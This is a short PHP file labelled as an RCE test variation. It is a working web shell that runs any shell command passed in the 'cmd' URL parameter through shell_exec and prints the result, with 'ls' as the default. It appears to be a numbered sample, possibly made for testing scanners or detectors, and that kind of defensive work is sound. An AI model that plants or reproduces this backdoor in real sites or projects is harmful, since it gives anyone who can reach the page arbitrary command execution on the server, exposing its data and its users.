<?php
// RCE test variation #685
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>